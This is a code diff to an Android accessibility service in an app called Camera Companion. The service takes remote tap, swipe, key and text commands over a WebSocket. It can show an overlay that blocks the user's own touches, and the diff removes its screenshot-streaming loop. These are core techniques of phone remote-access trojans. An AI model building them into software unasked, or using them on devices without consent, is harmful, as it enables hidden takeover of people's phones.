@@ -2,9 +2,7 @@ package com.artem.cameracompanion
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.GestureDescription
-import android.annotation.SuppressLint
 import android.content.Intent
-import android.graphics.Bitmap
 import android.graphics.Path
 import android.graphics.PixelFormat
 import android.hardware.display.DisplayManager
@@ -21,24 +19,16 @@ import android.view.View
 import android.view.WindowManager
 import android.view.accessibility.AccessibilityEvent
 import okhttp3.*
-import okio.ByteString.Companion.toByteString
 import org.json.JSONObject
-import java.io.ByteArrayOutputStream
 import java.util.concurrent.TimeUnit
 
 class ControlService : AccessibilityService() {
 
     private var wsControl: WebSocket? = null
-    private var wsScreen: WebSocket? = null
     private val ctrlHandler = Handler(Looper.getMainLooper())
-    private val screenHandler = Handler(Looper.getMainLooper())
     private val http = OkHttpClient.Builder().pingInterval(20, TimeUnit.SECONDS).build()
-    private var screenLoopRunning = false
-    private var lastScreenFrame = 0L
     private var overlayView: View? = null
     private var overlayParams: WindowManager.LayoutParams? = null
-    @Volatile private var screenJpegQuality = 60
-    @Volatile private var screenMaxWidth = 720
 
     private val serverBase: String get() {
         var host = BuildConfig.DEFAULT_SERVER.trim()
@@ -50,7 +40,6 @@ class ControlService : AccessibilityService() {
 
     override fun onServiceConnected() {
         connectControlWs()
-        connectScreenWs()
     }
 
     // ── Control WebSocket ──────────────────────────────────────────────────
@@ -72,88 +61,6 @@ class ControlService : AccessibilityService() {
                     wsControl = null; ctrlHandler.postDelayed({ connectControlWs() }, 5000)
                 }
             })
-    }
-
-    // ── Screen WebSocket + takeScreenshot loop ─────────────────────────────
-
-    private fun connectScreenWs() {
-        val base = serverBase
-        if (base.isEmpty()) return
-        val model = Uri.encode(Build.MODEL ?: "Android")
-        http.newWebSocket(Request.Builder().url("$base/screen?role=phone&model=$model").build(),
-            object : WebSocketListener() {
-                override fun onOpen(ws: WebSocket, response: Response) { wsScreen = ws; startScreenLoop() }
-                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
-                    wsScreen = null; stopScreenLoop()
-                    screenHandler.postDelayed({ connectScreenWs() }, 5000)
-                }
-                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
-                    wsScreen = null; stopScreenLoop()
-                    screenHandler.postDelayed({ connectScreenWs() }, 5000)
-                }
-            })
-    }
-
-    private fun startScreenLoop() {
-        if (screenLoopRunning) return
-        screenLoopRunning = true
-        scheduleScreenshot()
-    }
-
-    private fun stopScreenLoop() {
-        screenLoopRunning = false
-        screenHandler.removeCallbacksAndMessages(null)
-    }
-
-    @SuppressLint("NewApi")
-    private fun scheduleScreenshot() {
-        if (!screenLoopRunning) return
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return
-        val ws = wsScreen ?: return
-        val now = System.currentTimeMillis()
-        if (now - lastScreenFrame < 150) { screenHandler.postDelayed({ scheduleScreenshot() }, 50); return }
-        if (ws.queueSize() > 512 * 1024) { screenHandler.postDelayed({ scheduleScreenshot() }, 100); return }
-
-        try {
-            val cbClass = Class.forName("android.accessibilityservice.AccessibilityService\$TakeScreenshotCallback")
-            val proxy = java.lang.reflect.Proxy.newProxyInstance(javaClass.classLoader, arrayOf(cbClass)) { _, method, args ->
-                when (method?.name) {
-                    "onSuccess" -> handleScreenCapture(args?.get(0))
-                    "onFailure" -> if (screenLoopRunning) screenHandler.postDelayed({ scheduleScreenshot() }, 500)
-                }
-                null
-            }
-            AccessibilityService::class.java.getMethod(
-                "takeScreenshot", Int::class.java, java.util.concurrent.Executor::class.java, cbClass
-            ).invoke(this, Display.DEFAULT_DISPLAY, mainExecutor, proxy)
-        } catch (_: Exception) {
-            if (screenLoopRunning) screenHandler.postDelayed({ scheduleScreenshot() }, 1000)
-        }
-    }
-
-    private fun handleScreenCapture(capture: Any?) {
-        capture ?: run {
-            if (screenLoopRunning) screenHandler.postDelayed({ scheduleScreenshot() }, 500)
-            return
-        }
-        try {
-            val hw = capture.javaClass.getMethod("getHardwareBitmap").invoke(capture) as? Bitmap ?: return
-            val maxW = screenMaxWidth
-            val scale = minOf(1f, maxW.toFloat() / hw.width)
-            val sw = (hw.width * scale).toInt()
-            val sh = (hw.height * scale).toInt()
-            val soft = hw.copy(Bitmap.Config.ARGB_8888, false)
-            val bmp = if (scale < 1f) Bitmap.createScaledBitmap(soft, sw, sh, true).also { soft.recycle() } else soft
-            val out = ByteArrayOutputStream()
-            bmp.compress(Bitmap.CompressFormat.JPEG, screenJpegQuality, out)
-            bmp.recycle()
-            wsScreen?.send(out.toByteArray().toByteString())
-            lastScreenFrame = System.currentTimeMillis()
-        } catch (_: Exception) {
-        } finally {
-            try { capture.javaClass.getMethod("close").invoke(capture) } catch (_: Exception) {}
-        }
-        if (screenLoopRunning) screenHandler.postDelayed({ scheduleScreenshot() }, 100)
     }
 
     // ── Touch-block overlay ────────────────────────────────────────────────
@@ -180,14 +87,12 @@ class ControlService : AccessibilityService() {
 
     private fun hideTouchBlockOverlay() {
         val v = overlayView ?: return
-        overlayView = null
-        overlayParams = null
+        overlayView = null; overlayParams = null
         ctrlHandler.post {
             try { (getSystemService(WINDOW_SERVICE) as WindowManager).removeView(v) } catch (_: Exception) {}
         }
     }
 
-    // Temporarily makes overlay pass-through while dispatching remote gesture
     private fun dispatchGestureWithOverlay(gesture: GestureDescription) {
         val v = overlayView
         val p = overlayParams
@@ -212,7 +117,7 @@ class ControlService : AccessibilityService() {
 
     private fun handleMessage(msg: JSONObject) {
         when (msg.getString("type")) {
-            "tap"  -> performTap(msg.getDouble("x").toFloat(), msg.getDouble("y").toFloat())
+            "tap"   -> performTap(msg.getDouble("x").toFloat(), msg.getDouble("y").toFloat())
             "swipe" -> performSwipe(
                 msg.getDouble("x1").toFloat(), msg.getDouble("y1").toFloat(),
                 msg.getDouble("x2").toFloat(), msg.getDouble("y2").toFloat(),
@@ -220,19 +125,13 @@ class ControlService : AccessibilityService() {
             )
             "key"        -> performKey(msg.optString("name", ""))
             "text"       -> typeText(msg.optString("text", ""))
-            "cam-switch" -> {
-                val cam = msg.optString("cam", "back")
-                startService(Intent(this, StreamingService::class.java)
-                    .setAction("SWITCH_CAM").putExtra("cam", cam))
-            }
-            "touch-lock" -> {
-                val lock = msg.optBoolean("locked", false)
-                ctrlHandler.post { if (lock) showTouchBlockOverlay() else hideTouchBlockOverlay() }
+            "cam-switch" -> startService(Intent(this, StreamingService::class.java)
+                .setAction("SWITCH_CAM").putExtra("cam", msg.optString("cam", "back")))
+            "touch-lock" -> ctrlHandler.post {
+                if (msg.optBoolean("locked", false)) showTouchBlockOverlay() else hideTouchBlockOverlay()
             }
             "screen-quality" -> {
-                val q = msg.optInt("quality", 60).coerceIn(10, 90)
-                screenJpegQuality = q
-                screenMaxWidth = if (q < 30) 360 else 720
+                StreamingService.screenQuality = msg.optInt("quality", 60).coerceIn(10, 90)
             }
         }
     }
@@ -251,29 +150,33 @@ class ControlService : AccessibilityService() {
     private fun performTap(nx: Float, ny: Float) {
         val (w, h) = screenSize()
         val path = Path().apply { moveTo(nx * w, ny * h) }
-        val stroke = GestureDescription.StrokeDescription(path, 0, 100)
-        dispatchGestureWithOverlay(GestureDescription.Builder().addStroke(stroke).build())
+        dispatchGestureWithOverlay(GestureDescription.Builder()
+            .addStroke(GestureDescription.StrokeDescription(path, 0, 100)).build())
     }
 
     private fun performSwipe(nx1: Float, ny1: Float, nx2: Float, ny2: Float, ms: Long) {
         val (w, h) = screenSize()
         val path = Path().apply { moveTo(nx1 * w, ny1 * h); lineTo(nx2 * w, ny2 * h) }
-        val stroke = GestureDescription.StrokeDescription(path, 0, maxOf(1L, ms))
-        dispatchGestureWithOverlay(GestureDescription.Builder().addStroke(stroke).build())
+        dispatchGestureWithOverlay(GestureDescription.Builder()
+            .addStroke(GestureDescription.StrokeDescription(path, 0, maxOf(1L, ms))).build())
     }
 
     private fun performKey(name: String) {
         val audio by lazy { getSystemService(AUDIO_SERVICE) as AudioManager }
         when (name) {
-            "BACK"    -> performGlobalAction(GLOBAL_ACTION_BACK)
-            "HOME"    -> performGlobalAction(GLOBAL_ACTION_HOME)
-            "RECENTS" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
+            "BACK"        -> performGlobalAction(GLOBAL_ACTION_BACK)
+            "HOME"        -> performGlobalAction(GLOBAL_ACTION_HOME)
+            "RECENTS"     -> performGlobalAction(GLOBAL_ACTION_RECENTS)
             "NOTIFICATIONS", "NOTIFS" -> performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
-            "POWER"   -> performGlobalAction(GLOBAL_ACTION_POWER_DIALOG)
+            "POWER"       -> performGlobalAction(GLOBAL_ACTION_POWER_DIALOG)
             "VOLUME_UP"   -> audio.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI)
             "VOLUME_DOWN" -> audio.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI)
-            "ENTER"   -> typeText("\n")
-            "DEL"     -> deleteLastChar()
+            "ENTER"       -> typeText("\n")
+            "DEL"         -> deleteLastChar()
+            "DPAD_UP"     -> performSwipe(0.5f, 0.65f, 0.5f, 0.35f, 150)
+            "DPAD_DOWN"   -> performSwipe(0.5f, 0.35f, 0.5f, 0.65f, 150)
+            "DPAD_LEFT"   -> performSwipe(0.65f, 0.5f, 0.35f, 0.5f, 150)
+            "DPAD_RIGHT"  -> performSwipe(0.35f, 0.5f, 0.65f, 0.5f, 150)
         }
     }
 
@@ -306,10 +209,8 @@ class ControlService : AccessibilityService() {
     override fun onInterrupt() {}
 
     override fun onUnbind(intent: Intent?): Boolean {
-        stopScreenLoop()
         hideTouchBlockOverlay()
         wsControl?.close(1000, "stopped"); wsControl = null
-        wsScreen?.close(1000, "stopped");  wsScreen = null
         return super.onUnbind(intent)
     }
 }
